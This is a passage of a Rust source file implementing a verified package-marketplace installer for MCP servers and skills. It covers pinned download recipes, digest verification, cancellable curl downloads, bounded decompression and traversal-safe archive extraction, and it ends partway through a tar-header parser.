//! Verified one-click marketplace package installation, update, configuration,
//! uninstall, progress tracking, cancellation, rollback, and crash recovery.

use std::collections::{BTreeMap, BTreeSet, HashMap, VecDeque};
use std::ffi::{OsStr, OsString};
use std::fs::{self, File};
use std::io::{self, Read, Write};
use std::os::unix::fs::PermissionsExt;
use std::path::{Component, Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::atomic::{AtomicBool, AtomicI32, AtomicU64, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{SystemTime, UNIX_EPOCH};

use mcp_gateway::security::audit::{AuditPhase, AuditSink};
use mcp_gateway::security::linux_fs::open_absolute_dir;
use rustix::fd::OwnedFd;
use rustix::fs::{self as rfs, FileType, Mode, OFlags, ResolveFlags};
use serde::{Deserialize, Serialize};
use serde_json::{Value, json};
use sha2::{Digest, Sha256, Sha512};

use super::server_name;
use crate::http::admission::{parse_clients, parse_document};
use crate::http::operator::{PolicyFile, verify_approvals};
use crate::skills::Skill;
use crate::tools::registry::Tool;

const MARKETPLACE_JSON: &str = include_str!("../http/dashboard/marketplace.json");

const MAX_DOWNLOAD_BYTES: usize = 96 * 1024 * 1024;
const MAX_UNPACKED_BYTES: usize = 256 * 1024 * 1024;
const MAX_SINGLE_FILE_BYTES: usize = 50 * 1024 * 1024;
const MAX_ARCHIVE_FILES: usize = 30_000;
const MAX_ARCHIVE_DEPTH: usize = 16;
const MAX_NPM_PACKAGES: usize = 128;
const MAX_PYPI_PACKAGES: usize = 64;
const MAX_OPERATIONS: usize = 32;

const HELP: &str = "usage: veyl marketplace list | recipes | status | install ID [--version V] [--url URL] [--sha256 HEX] [--sha512 SRI] [--registry URL] [--families LIST] [--member PATH] [--type npm|pypi|binary|skill] | update ID | configure ID [--families LIST] [--enable|--disable] | uninstall ID | cancel OP_ID | recover (append --config PATH)";

const REA_TARBALL_URL: &str = "https://registry.npmjs.org/rea-agents/-/rea-agents-6.10.1.tgz";
const REA_TARBALL_SRI: &str = "sha512-3AWrfFEXppvC98FWhZR2Tzulnqs5xJQrSKmAub6+QME/I58Pr3h8pHqqwM30z2DvlnIx/8Hsu8woMngfi4SNyg==";
const REA_ATTESTATION_URL: &str =
    "https://registry.npmjs.org/-/npm/v1/attestations/rea-agents@6.10.1";

const RUST_ANYTHING_URL: &str = "https://github.com/erkamyaman/rust-anything/releases/download/v4.1.0/rust-anything-v4.1.0-x86_64-unknown-linux-gnu.tar.gz";
const RUST_ANYTHING_SHA256: &str =
    "12c2426d5c0c041c326447fb313866c92cb246e96ab96cd86cbd4a98fca0eb48";

const ANTHROPIC_SKILLS_COMMIT: &str = "1780c5e5a552fd4d1c9d6a7b0cab26b0c2bef064";

const REA_FAMILIES: &[&str] = &[
    "direct",
    "enhanced",
    "native",
    "artifact",
    "managed",
    "firmware",
    "uefi",
    "android",
    "pcap",
    "flutter",
    "frida",
    "apktool",
    "jeb",
    "adb",
    "browser",
    "electron",
    "javascript-runtime",
    "application",
    "session",
];

#[derive(Clone, Copy, PartialEq, Eq)]
pub(crate) enum ProviderKind {
    Npm,
    Pypi,
    Binary,
    Skill,
}

impl ProviderKind {
    fn as_str(self) -> &'static str {
        match self {
            Self::Npm => "npm",
            Self::Pypi => "pypi",
            Self::Binary => "binary",
            Self::Skill => "skill",
        }
    }

    fn parse(raw: &str) -> Option<Self> {
        match raw {
            "npm" => Some(Self::Npm),
            "pypi" => Some(Self::Pypi),
            "binary" | "standalone" => Some(Self::Binary),
            "skill" => Some(Self::Skill),
            _ => None,
        }
    }
}

#[derive(Clone)]
struct VerifiedRecipe {
    id: &'static str,
    name: &'static str,
    kind: ProviderKind,
    version: &'static str,
    url: &'static str,
    package: Option<&'static str>,
    sha256: Option<&'static str>,
    sha512_sri: Option<&'static str>,
    attestation: Option<&'static str>,
    member: Option<&'static str>,
    entrypoint: &'static str,
    default_families: Option<&'static str>,
    allow_bundled_only: bool,
    summary: &'static str,
}

const RECIPES: &[VerifiedRecipe] = &[
    VerifiedRecipe {
        id: "rea",
        name: "Reverse Engineer Anything (REA)",
        kind: ProviderKind::Npm,
        version: "6.10.1",
        url: REA_TARBALL_URL,
        package: Some("rea-agents"),
        sha256: None,
        sha512_sri: Some(REA_TARBALL_SRI),
        attestation: Some(REA_ATTESTATION_URL),
        member: None,
        entrypoint: "scripts/rea.mjs",
        default_families: Some("artifact"),
        allow_bundled_only: true,
        summary: "Pinned npm tarball with SLSA provenance and 43 bundled dependencies; zero lifecycle scripts.",
    },
    VerifiedRecipe {
        id: "rust-anything",
        name: "Rust Anything",
        kind: ProviderKind::Binary,
        version: "4.1.0",
        url: RUST_ANYTHING_URL,
        package: None,
        sha256: Some(RUST_ANYTHING_SHA256),
        sha512_sri: None,
        attestation: Some(
            "https://github.com/erkamyaman/rust-anything/releases/download/v4.1.0/SHA256SUMS",
        ),
        member: Some("rust-anything"),
        entrypoint: "bin/rust-anything",
        default_families: None,
        allow_bundled_only: false,
        summary: "Official GitHub release v4.1.0 ELF binary verified against SHA256SUMS.",
    },
    VerifiedRecipe {
        id: "npm-modelcontextprotocol-server-filesystem",
        name: "@modelcontextprotocol/server-filesystem",
        kind: ProviderKind::Npm,
        version: "2.3.0",
        url: "https://registry.npmjs.org/@modelcontextprotocol/server-filesystem",
        package: Some("@modelcontextprotocol/server-filesystem"),
        sha256: None,
        sha512_sri: Some(
            "sha512-dnwDFqYi2Q3VbFDnVOUme4+81CzwHBj3OKeYEgZ6UkBp7rWSm5OKiidemgIF0kkt5AyAi6mHsqx0cfTZBP1DJQ==",
        ),
        attestation: None,
        member: None,
        entrypoint: "dist/index.js",
        default_families: None,
        allow_bundled_only: false,
        summary: "Reviewed official MCP filesystem Node server resolved via verified npm tarballs without scripts.",
    },
    VerifiedRecipe {
        id: "pypi-mcp-server-git",
        name: "mcp-server-git",
        kind: ProviderKind::Pypi,
        version: "2026.11.18",
        url: "https://pypi.org/pypi/mcp-server-git/2026.11.18/json",
        package: Some("mcp-server-git"),
        sha256: None,
        sha512_sri: None,
        attestation: None,
        member: None,
        entrypoint: "mcp_server_git:main",
        default_families: None,
        allow_bundled_only: false,
        summary: "Reviewed official PyPI pure-Python wheel runtime staged in private site-packages.",
    },
    VerifiedRecipe {
        id: "skill-skill-creator",
        name: "skill-creator",
        kind: ProviderKind::Skill,
        version: ANTHROPIC_SKILLS_COMMIT,
        url: "https://codeload.github.com/anthropics/skills/tar.gz/1780c5e5a552fd4d1c9d6a7b0cab26b0c2bef064",
        package: None,
        sha256: None,
        sha512_sri: None,
        attestation: None,
        member: Some("skills/skill-creator/SKILL.md"),
        entrypoint: "skill-creator",
        default_families: None,
        allow_bundled_only: false,
        summary: "Validated Anthropic skill pinned to commit 1780c5e5; guidance-only SKILL.md extraction.",
    },
];

#[derive(Clone, Debug, Default, Deserialize, Serialize)]
pub(crate) struct InstallRequest {
    pub id: String,
    #[serde(default)]
    pub package: Option<String>,
    #[serde(default)]
    pub version: Option<String>,
    #[serde(default)]
    pub kind: Option<String>,
    #[serde(default)]
    pub url: Option<String>,
    #[serde(default)]
    pub sha256: Option<String>,
    #[serde(default)]
    pub sha512: Option<String>,
    #[serde(default)]
    pub registry_url: Option<String>,
    #[serde(default)]
    pub tool_families: Option<String>,
    #[serde(default)]
    pub binary_member: Option<String>,
    #[serde(default)]
    pub entrypoint: Option<String>,
    #[serde(default)]
    pub args: Option<Vec<String>>,
    #[serde(default)]
    pub update: bool,
}

#[derive(Clone, Debug, Deserialize, Serialize)]
pub(crate) struct InstallReceipt {
    pub id: String,
    pub kind: String,
    pub version: String,
    pub source_url: String,
    pub digest: String,
    pub installed_at: u64,
    pub enabled: bool,
    #[serde(default)]
    pub tool_families: Option<String>,
    #[serde(default)]
    pub command: String,
    #[serde(default)]
    pub args: Vec<String>,
    #[serde(default)]
    pub skill_name: Option<String>,
    #[serde(default)]
    pub provenance: Option<String>,
}

#[derive(Clone, Debug, Deserialize, Serialize)]
struct CrashJournal {
    op_id: String,
    id: String,
    kind: String,
    phase: String,
    is_skill: bool,
    skill_name: Option<String>,
    had_previous_bundle: bool,
    previous_server: Option<Value>,
    previous_receipt: Option<InstallReceipt>,
    started_at: u64,
}

#[derive(Clone)]
pub(crate) struct OperationSnapshot {
    pub op_id: String,
    pub id: String,
    pub kind: String,
    pub phase: String,
    pub bytes_downloaded: u64,
    pub total_bytes: Option<u64>,
    pub percent: Option<u8>,
    pub message: String,
    pub error: Option<String>,
    pub done: bool,
    pub updated_at: u64,
}

struct LiveOp {
    snapshot: OperationSnapshot,
    cancelled: Arc<AtomicBool>,
    child_pid: Arc<AtomicI32>,
    bytes: Arc<AtomicU64>,
    total: Arc<AtomicU64>,
}

impl LiveOp {
    fn snapshot(&self) -> OperationSnapshot {
        let mut s = self.snapshot.clone();
        let downloaded = self.bytes.load(Ordering::Relaxed);
        let total = self.total.load(Ordering::Relaxed);
        if !s.done && downloaded > 0 {
            s.bytes_downloaded = downloaded;
        }
        if total > 0 {
            s.total_bytes = Some(total);
            s.percent = Some(((downloaded.min(total) * 100) / total) as u8);
        }
        s
    }
}

#[derive(Default)]
pub(crate) struct MarketplaceManager {
    ops: Mutex<HashMap<String, LiveOp>>,
}

impl MarketplaceManager {
    pub(crate) fn new() -> Self {
        Self::default()
    }

    pub(crate) fn state(&self, config: &Path) -> Result<Value, String> {
        let _ = reconcile_interrupted_inactive(config, &self.active_ids());
        let recipes: Vec<Value> = RECIPES
            .iter()
            .map(|r| {
                json!({
                    "id": r.id,
                    "name": r.name,
                    "type": r.kind.as_str(),
                    "version": r.version,
                    "url": r.url,
                    "sha256": r.sha256,
                    "sha512": r.sha512_sri,
                    "attestation": r.attestation,
                    "default_families": r.default_families,
                    "supported_families": if r.id == "rea" { Some(REA_FAMILIES) } else { None },
                    "summary": r.summary,
                })
            })
            .collect();
        let installed = list_receipts(config)?;
        let ops = self.operations_json();
        Ok(json!({
            "recipes": recipes,
            "installed": installed,
            "operations": ops,
        }))
    }

    fn active_ids(&self) -> BTreeSet<String> {
        self.ops
            .lock()
            .map(|guard| {
                guard
                    .values()
                    .filter(|op| !op.snapshot.done)
                    .map(|op| op.snapshot.op_id.clone())
                    .collect()
            })
            .unwrap_or_default()
    }

    fn operations_json(&self) -> Vec<Value> {
        let Ok(guard) = self.ops.lock() else {
            return Vec::new();
        };
        let mut list: Vec<OperationSnapshot> = guard.values().map(LiveOp::snapshot).collect();
        list.sort_by(|a, b| b.updated_at.cmp(&a.updated_at).then(b.op_id.cmp(&a.op_id)));
        list.truncate(MAX_OPERATIONS);
        list.into_iter()
            .map(|op| {
                json!({
                    "op_id": op.op_id,
                    "id": op.id,
                    "kind": op.kind,
                    "phase": op.phase,
                    "bytes_downloaded": op.bytes_downloaded,
                    "total_bytes": op.total_bytes,
                    "percent": op.percent,
                    "message": op.message,
                    "error": op.error,
                    "done": op.done,
                    "updated_at": op.updated_at,
                })
            })
            .collect()
    }

    pub(crate) fn start_async(
        self: &Arc<Self>,
        config: PathBuf,
        req: InstallRequest,
    ) -> Result<String, String> {
        if rustix::process::geteuid().is_root() {
            return Err("Use the local unprivileged operator identity".into());
        }
        let target_id = resolve_target_id(&req)?;
        {
            let mut guard = self
                .ops
                .lock()
                .map_err(|_| "Marketplace state lock unavailable")?;
            if guard
                .values()
                .any(|op| !op.snapshot.done && op.snapshot.id == target_id)
            {
                return Err(
                    "An installation operation is already running for this provider".into(),
                );
            }
            if guard.len() >= MAX_OPERATIONS {
                let oldest: Vec<String> = guard
                    .values()
                    .filter(|op| op.snapshot.done)
                    .map(|op| op.snapshot.op_id.clone())
                    .take(16)
                    .collect();
                for k in oldest {
                    guard.remove(&k);
                }
            }
            let op_id = new_op_id()?;
            let cancelled = Arc::new(AtomicBool::new(false));
            let child_pid = Arc::new(AtomicI32::new(0));
            let bytes = Arc::new(AtomicU64::new(0));
            let total = Arc::new(AtomicU64::new(0));
            let kind_label = if req.update { "update" } else { "install" }.to_owned();
            guard.insert(
                op_id.clone(),
                LiveOp {
                    snapshot: OperationSnapshot {
                        op_id: op_id.clone(),
                        id: target_id.clone(),
                        kind: kind_label,
                        phase: "queued".into(),
                        bytes_downloaded: 0,
                        total_bytes: None,
                        percent: None,
                        message: format!("Queued {target_id}"),
                        error: None,
                        done: false,
                        updated_at: now_secs(),
                    },
                    cancelled: Arc::clone(&cancelled),
                    child_pid: Arc::clone(&child_pid),
                    bytes: Arc::clone(&bytes),
                    total: Arc::clone(&total),
                },
            );
            let manager = Arc::clone(self);
            let id_for_thread = op_id.clone();
            std::thread::spawn(move || {
                let outcome = execute_install(
                    &config,
                    &id_for_thread,
                    &req,
                    Some(&manager),
                    &cancelled,
                    &child_pid,
                    &bytes,
                    &total,
                );
                manager.finish_op(&id_for_thread, outcome, cancelled.load(Ordering::Relaxed));
            });
            Ok(op_id)
        }
    }

    pub(crate) fn cancel(&self, op_id: &str) -> Result<bool, String> {
        let guard = self
            .ops
            .lock()
            .map_err(|_| "Marketplace state lock unavailable")?;
        let Some(op) = guard.get(op_id) else {
            return Err("Unknown marketplace operation".into());
        };
        if op.snapshot.done {
            return Ok(false);
        }
        op.cancelled.store(true, Ordering::Relaxed);
        let pid = op.child_pid.load(Ordering::Relaxed);
        if pid > 0
            && let Some(raw) = rustix::process::Pid::from_raw(pid)
        {
            let _ = rustix::process::kill_process(raw, rustix::process::Signal::TERM);
        }
        Ok(true)
    }

    fn set_phase(&self, op_id: &str, phase: &str, message: String, percent: Option<u8>) {
        if let Ok(mut guard) = self.ops.lock()
            && let Some(op) = guard.get_mut(op_id)
            && !op.snapshot.done
        {
            op.snapshot.phase = phase.to_owned();
            op.snapshot.message = message;
            if percent.is_some() {
                op.snapshot.percent = percent;
            }
            op.snapshot.updated_at = now_secs();
        }
    }

    fn finish_op(&self, op_id: &str, outcome: Result<Value, String>, was_cancelled: bool) {
        if let Ok(mut guard) = self.ops.lock()
            && let Some(op) = guard.get_mut(op_id)
        {
            op.snapshot.bytes_downloaded = op.bytes.load(Ordering::Relaxed);
            let total = op.total.load(Ordering::Relaxed);
            if total > 0 {
                op.snapshot.total_bytes = Some(total);
            }
            op.snapshot.done = true;
            op.snapshot.updated_at = now_secs();
            match outcome {
                Ok(val) => {
                    op.snapshot.phase = "ready".into();
                    op.snapshot.percent = Some(100);
                    op.snapshot.message = val["message"]
                        .as_str()
                        .unwrap_or("Installed and verified")
                        .to_owned();
                }
                Err(err) => {
                    if was_cancelled {
                        op.snapshot.phase = "cancelled".into();
                        op.snapshot.percent = None;
                        op.snapshot.message = "Cancelled by operator; staged files cleaned".into();
                        op.snapshot.error = Some(err);
                    } else {
                        op.snapshot.phase = "failed".into();
                        op.snapshot.percent = None;
                        op.snapshot.message = format!("Installation failed: {err}");
                        op.snapshot.error = Some(err);
                    }
                }
            }
        }
    }
}

fn now_secs() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs()
}

fn new_op_id() -> Result<String, String> {
    Ok(format!(
        "op-{}",
        crate::http::operator::revision().map_err(|_| "Random bytes unavailable")?
    ))
}

fn safe_catalog_id(raw: &str) -> Result<String, String> {
    if raw.is_empty()
        || raw.len() > 64
        || !raw
            .bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || matches!(b, b'-' | b'_'))
    {
        return Err("Invalid marketplace identifier".into());
    }
    Ok(raw.to_owned())
}

fn server_id_from_catalog(raw: &str) -> Result<String, String> {
    let clean: String = raw
        .chars()
        .filter(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || *c == '-' || *c == '_')
        .take(24)
        .collect();
    if !server_name(&clean) {
        return Err(
            "Provider ID must be 1..=24 lowercase letters, digits, hyphens, or underscores".into(),
        );
    }
    Ok(clean)
}

fn resolve_target_id(req: &InstallRequest) -> Result<String, String> {
    if server_name(&req.id) {
        return Ok(req.id.clone());
    }
    safe_catalog_id(&req.id)?;
    server_id_from_catalog(&req.id)
}

fn lookup_catalog(id: &str) -> Result<Option<Value>, String> {
    let doc: Value = serde_json::from_str(MARKETPLACE_JSON)
        .map_err(|_| "Bundled marketplace catalog unavailable")?;
    let Some(entries) = doc["entries"].as_array() else {
        return Ok(None);
    };
    Ok(entries
        .iter()
        .find(|e| e["id"].as_str() == Some(id))
        .cloned())
}

pub(crate) fn validate_rea_families(raw: &str) -> Result<String, String> {
    let items: Vec<&str> = raw
        .split(',')
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .collect();
    if items.is_empty() || items.len() > 19 {
        return Err("REA_MCP_TOOL_FAMILIES must be a non-empty comma-separated list".into());
    }
    let mut normalized = Vec::new();
    for item in items {
        if !REA_FAMILIES.contains(&item) {
            return Err(format!("Unsupported REA tool family: {item}"));
        }
        if !normalized.contains(&item) {
            normalized.push(item);
        }
    }
    Ok(normalized.join(","))
}

fn validate_npm_pkg_name(name: &str) -> Result<(), String> {
    if name.is_empty()
        || name.len() > 160
        || name.contains("..")
        || name.contains('\\')
        || name.chars().any(char::is_control)
        || name.starts_with('.')
        || name.starts_with('-')
    {
        return Err("Invalid npm package name".into());
    }
    if let Some((scope, pkg)) = name.split_once('/')
        && (!scope.starts_with('@') || scope.len() < 2 || pkg.is_empty() || pkg.contains('/'))
    {
        return Err("Invalid scoped npm package name".into());
    }
    if !name.bytes().all(|b| {
        b.is_ascii_lowercase()
            || b.is_ascii_digit()
            || matches!(b, b'@' | b'/' | b'-' | b'_' | b'.')
    }) {
        return Err("Unsupported characters in npm package name".into());
    }
    Ok(())
}

fn validate_pypi_pkg_name(name: &str) -> Result<(), String> {
    if name.is_empty()
        || name.len() > 128
        || !name
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'-' | b'_' | b'.'))
    {
        return Err("Invalid PyPI package name".into());
    }
    Ok(())
}

fn validate_version(ver: &str) -> Result<(), String> {
    if ver.is_empty()
        || ver.len() > 64
        || ver.chars().any(char::is_control)
        || !ver
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b'_' | b'+'))
    {
        return Err("Invalid package version".into());
    }
    Ok(())
}

fn validate_download_url(raw: &str) -> Result<bool, String> {
    if raw.len() > 1024
        || raw.is_empty()
        || raw.chars().any(char::is_control)
        || raw.contains(char::is_whitespace)
        || raw.contains('@')
    {
        return Err("Invalid artifact URL".into());
    }
    if let Some(rest) = raw.strip_prefix("https://") {
        let host = rest.split('/').next().unwrap_or("");
        if host.is_empty() || host == "localhost" {
            return Err("Invalid HTTPS host".into());
        }
        return Ok(false);
    }
    if let Some(rest) = raw.strip_prefix("http://127.0.0.1:") {
        let authority = rest.split('/').next().unwrap_or("");
        let port: u16 = authority
            .parse()
            .map_err(|_| "Loopback test URL requires numeric port")?;
        if port == 0 {
            return Err("Invalid loopback port".into());
        }
        return Ok(true);
    }
    Err(
        "Artifact URLs must use HTTPS (or isolated http://127.0.0.1:<port> loopback for tests)"
            .into(),
    )
}

fn fetch_bytes(
    url: &str,
    limit: usize,
    cancelled: &AtomicBool,
    child_pid: &AtomicI32,
    bytes_counter: &AtomicU64,
    total_counter: &AtomicU64,
) -> Result<Vec<u8>, String> {
    if cancelled.load(Ordering::Relaxed) {
        return Err("Operation cancelled".into());
    }
    let loopback = validate_download_url(url)?;
    if !loopback && total_counter.load(Ordering::Relaxed) == 0 {
        // Unknown total size until headers/transfer complete cleanly.
        total_counter.store(0, Ordering::Relaxed);
    }
    let mut cmd = Command::new("/usr/bin/curl");
    cmd.env_clear();
    if loopback {
        cmd.args([
            "-q",
            "--fail",
            "--silent",
            "--show-error",
            "--noproxy",
            "*",
            "--max-redirs",
            "0",
            "--proto",
            "=http",
            "--connect-timeout",
            "5",
            "--max-time",
            "60",
            "--user-agent",
            "Veyl-installer",
            "--url",
            url,
        ]);
    } else {
        cmd.args([
            "-q",
            "--fail",
            "--silent",
            "--show-error",
            "--location",
            "--max-redirs",
            "5",
            "--proto",
            "=https",
            "--proto-redir",
            "=https",
            "--connect-timeout",
            "10",
            "--max-time",
            "120",
            "--user-agent",
            "Veyl-installer",
            "--url",
            url,
        ]);
    }
    cmd.stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    let mut child = cmd
        .spawn()
        .map_err(|_| "Failed to execute curl downloader (/usr/bin/curl required)".to_owned())?;
    child_pid.store(child.id() as i32, Ordering::Relaxed);
    let mut stdout = child.stdout.take().ok_or("Missing curl stdout")?;
    let mut stderr = child.stderr.take();

    let mut out = Vec::new();
    let mut buf = [0u8; 32 * 1024];
    loop {
        if cancelled.load(Ordering::Relaxed) {
            let _ = child.kill();
            let _ = child.wait();
            child_pid.store(0, Ordering::Relaxed);
            return Err("Operation cancelled".into());
        }
        let n = stdout
            .read(&mut buf)
            .map_err(|_| "Download interrupted while reading response")?;
        if n == 0 {
            break;
        }
        if out.len() + n > limit {
            let _ = child.kill();
            let _ = child.wait();
            child_pid.store(0, Ordering::Relaxed);
            return Err("Artifact exceeded maximum allowed download size".into());
        }
        out.extend_from_slice(&buf[..n]);
        bytes_counter.fetch_add(n as u64, Ordering::Relaxed);
    }
    let status = child
        .wait()
        .map_err(|_| "Failed waiting for downloader exit")?;
    child_pid.store(0, Ordering::Relaxed);
    if cancelled.load(Ordering::Relaxed) {
        return Err("Operation cancelled".into());
    }
    if !status.success() {
        let mut err_buf = Vec::new();
        if let Some(se) = stderr.take() {
            let _ = se.take(512).read_to_end(&mut err_buf);
        }
        let msg = String::from_utf8_lossy(&err_buf).trim().to_owned();
        return Err(if msg.is_empty() {
            "Download failed".into()
        } else {
            format!("Download failed: {msg}")
        });
    }
    Ok(out)
}

fn verify_sha256_hex(bytes: &[u8], expected_hex: &str) -> Result<String, String> {
    let norm = expected_hex.trim().to_ascii_lowercase();
    if norm.len() != 64 || !norm.bytes().all(|b| b.is_ascii_hexdigit()) {
        return Err("Expected valid 64-char SHA-256 hex digest".into());
    }
    let actual = format!("{:x}", Sha256::digest(bytes));
    if !constant_time_eq(actual.as_bytes(), norm.as_bytes()) {
        return Err(format!(
            "SHA-256 integrity mismatch (expected {norm}, got {actual})"
        ));
    }
    Ok(format!("sha256:{actual}"))
}

fn verify_sha512_sri(bytes: &[u8], sri: &str) -> Result<String, String> {
    let encoded = sri
        .trim()
        .strip_prefix("sha512-")
        .ok_or("Expected sha512-... SRI integrity digest")?;
    let expected = base64_decode(encoded).map_err(|_| "Malformed base64 SHA-512 SRI")?;
    if expected.len() != 64 {
        return Err("Invalid SHA-512 SRI digest length".into());
    }
    let actual = Sha512::digest(bytes);
    if !constant_time_eq(&actual, &expected) {
        return Err("SHA-512 tarball integrity verification failed".into());
    }
    Ok(sri.trim().to_owned())
}

fn verify_digest(
    bytes: &[u8],
    sha256: Option<&str>,
    sha512_sri: Option<&str>,
) -> Result<String, String> {
    if let Some(hex) = sha256 {
        return verify_sha256_hex(bytes, hex);
    }
    if let Some(sri) = sha512_sri {
        return verify_sha512_sri(bytes, sri);
    }
    Err("Missing required cryptographic digest pin (sha256 or sha512 SRI)".into())
}

fn constant_time_eq(a: &[u8], b: &[u8]) -> bool {
    use subtle::ConstantTimeEq;
    a.len() == b.len() && bool::from(a.ct_eq(b))
}

fn base64_decode(input: &str) -> Result<Vec<u8>, ()> {
    let clean: Vec<u8> = input.bytes().filter(|b| !b.is_ascii_whitespace()).collect();
    if !clean.len().is_multiple_of(4) {
        return Err(());
    }
    let mut out = Vec::with_capacity(clean.len() * 3 / 4);
    for chunk in clean.as_chunks::<4>().0 {
        let mut vals = [0u8; 4];
        let mut pad = 0usize;
        for (i, &c) in chunk.iter().enumerate() {
            if c == b'=' {
                pad += 1;
                vals[i] = 0;
            } else if pad > 0 {
                return Err(());
            } else {
                vals[i] = match c {
                    b'A'..=b'Z' => c - b'A',
                    b'a'..=b'z' => c - b'a' + 26,
                    b'0'..=b'9' => c - b'0' + 52,
                    b'+' => 62,
                    b'/' => 63,
                    _ => return Err(()),
                };
            }
        }
        if pad > 2 {
            return Err(());
        }
        let n = ((vals[0] as u32) << 18)
            | ((vals[1] as u32) << 12)
            | ((vals[2] as u32) << 6)
            | (vals[3] as u32);
        out.push((n >> 16) as u8);
        if pad < 2 {
            out.push(((n >> 8) & 0xff) as u8);
        }
        if pad == 0 {
            out.push((n & 0xff) as u8);
        }
    }
    Ok(out)
}

fn validate_rel_path(raw: &str, strip_prefix: Option<&str>) -> Result<Option<PathBuf>, String> {
    if raw.is_empty()
        || raw.len() > 512
        || raw.contains('\0')
        || raw.contains('\\')
        || raw.chars().any(char::is_control)
    {
        return Err("Archive member contains forbidden characters".into());
    }
    if raw.starts_with('/') {
        return Err("Archive member must not use an absolute path".into());
    }
    let mut clean_parts: Vec<&str> = Vec::new();
    for part in raw.split('/') {
        if part.is_empty() || part == "." {
            continue;
        }
        if part == ".." {
            return Err("Archive member attempts directory traversal (..)".into());
        }
        clean_parts.push(part);
    }
    if let Some(prefix) = strip_prefix {
        let trimmed = prefix.trim_matches('/');
        if !trimmed.is_empty() {
            let prefix_parts: Vec<&str> = trimmed.split('/').collect();
            if clean_parts.len() < prefix_parts.len()
                || clean_parts[..prefix_parts.len()] != prefix_parts[..]
            {
                return Ok(None);
            }
            clean_parts.drain(..prefix_parts.len());
        }
    }
    if clean_parts.is_empty() {
        return Ok(None);
    }
    if clean_parts.len() > MAX_ARCHIVE_DEPTH {
        return Err("Archive path depth exceeds bound".into());
    }
    let mut pb = PathBuf::new();
    for p in clean_parts {
        pb.push(p);
    }
    Ok(Some(pb))
}

fn gunzip_bounded(bytes: &[u8]) -> Result<Vec<u8>, String> {
    if bytes.len() < 2 || bytes[0] != 0x1f || bytes[1] != 0x8b {
        return Err("Expected gzip-compressed archive (.tar.gz/.tgz)".into());
    }
    let mut cmd = Command::new("/usr/bin/gzip");
    cmd.env_clear()
        .arg("-dc")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    let mut child = cmd.spawn().map_err(|_| "Failed to launch /usr/bin/gzip")?;
    let mut stdin = child.stdin.take().ok_or("Missing gzip stdin")?;
    let owned = bytes.to_vec();
    let writer = std::thread::spawn(move || stdin.write_all(&owned));
    let mut out = Vec::new();
    {
        let stdout = child.stdout.take().ok_or("Missing gzip stdout")?;
        stdout
            .take((MAX_UNPACKED_BYTES + 1) as u64)
            .read_to_end(&mut out)
            .map_err(|_| "Failed reading decompressed archive stream")?;
    }
    let _ = writer.join();
    if out.len() > MAX_UNPACKED_BYTES {
        let _ = child.kill();
        let _ = child.wait();
        return Err("Decompressed archive exceeds 256 MiB safety limit (bomb guard)".into());
    }
    let status = child.wait().map_err(|_| "Failed waiting for gzip")?;
    if !status.success() {
        return Err("Corrupt gzip archive stream".into());
    }
    Ok(out)
}

struct ExtractBudget {
    files: usize,
    bytes: usize,
}

impl ExtractBudget {
    fn account(&mut self, size: usize) -> Result<(), String> {
        if size > MAX_SINGLE_FILE_BYTES {
            return Err("Archive member exceeds 50 MiB file size limit".into());
        }
        self.files += 1;
        if self.files > MAX_ARCHIVE_FILES {
            return Err("Archive exceeds maximum entry count (30000)".into());
        }
        self.bytes = self
            .bytes
            .checked_add(size)
            .filter(|n| *n <= MAX_UNPACKED_BYTES)
            .ok_or("Unpacked archive size exceeds 256 MiB limit")?;
        Ok(())
    }
}

fn ensure_dir_chain(root: &OwnedFd, rel: &Path) -> io::Result<OwnedFd> {
    let mut cur = rfs::openat(
        root,
        ".",
        OFlags::RDONLY | OFlags::DIRECTORY | OFlags::CLOEXEC,
        Mode::empty(),
    )?;
    for comp in rel.components() {
        let Component::Normal(name) = comp else {
            return Err(io::Error::new(io::ErrorKind::InvalidInput, "bad component"));
        };
        match rfs::mkdirat(&cur, name, Mode::RWXU) {
            Ok(()) => {}
            Err(rustix::io::Errno::EXIST) => {}
            Err(e) => return Err(e.into()),
        }
        cur = rfs::openat2(
            &cur,
            name,
            OFlags::RDONLY | OFlags::DIRECTORY | OFlags::CLOEXEC,
            Mode::empty(),
            ResolveFlags::BENEATH
                | ResolveFlags::NO_SYMLINKS
                | ResolveFlags::NO_XDEV
                | ResolveFlags::NO_MAGICLINKS,
        )?;
        let st = rfs::fstat(&cur)?;
        if FileType::from_raw_mode(st.st_mode) != FileType::Directory {
            return Err(io::Error::new(
                io::ErrorKind::AlreadyExists,
                "Path collision with non-directory entry",
            ));
        }
    }
    Ok(cur)
}

fn write_regular_beneath(
    root: &OwnedFd,
    rel: &Path,
    data: &[u8],
    executable: bool,
) -> Result<(), String> {
    let parent_rel = rel.parent().unwrap_or_else(|| Path::new(""));
    let fname = rel.file_name().ok_or("Archive entry missing file name")?;
    let dir = if parent_rel.as_os_str().is_empty() {
        rfs::openat(
            root,
            ".",
            OFlags::RDONLY | OFlags::DIRECTORY | OFlags::CLOEXEC,
            Mode::empty(),
        )
        .map_err(io::Error::from)
    } else {
        ensure_dir_chain(root, parent_rel)
    }
    .map_err(|e| format!("Failed creating bundle directory: {e}"))?;

    let mode = if executable {
        Mode::RWXU
    } else {
        Mode::RUSR | Mode::WUSR
    };
    let flags = OFlags::WRONLY | OFlags::CREATE | OFlags::EXCL | OFlags::CLOEXEC;
    let fd = rfs::openat2(
        &dir,
        fname,
        flags,
        mode,
        ResolveFlags::BENEATH
            | ResolveFlags::NO_SYMLINKS
            | ResolveFlags::NO_XDEV
            | ResolveFlags::NO_MAGICLINKS,
    )
    .map_err(|e| format!("Failed creating extracted file {}: {e}", rel.display()))?;
    let mut f = File::from(fd);
    f.write_all(data)
        .map_err(|e| format!("Failed writing {}: {e}", rel.display()))?;
    Ok(())
}

fn parse_octal(field: &[u8]) -> Result<usize, String> {
    let s = std::str::from_utf8(field)
        .map_err(|_| "Invalid octal tar header")?
        .trim_end_matches(['\0', ' '])
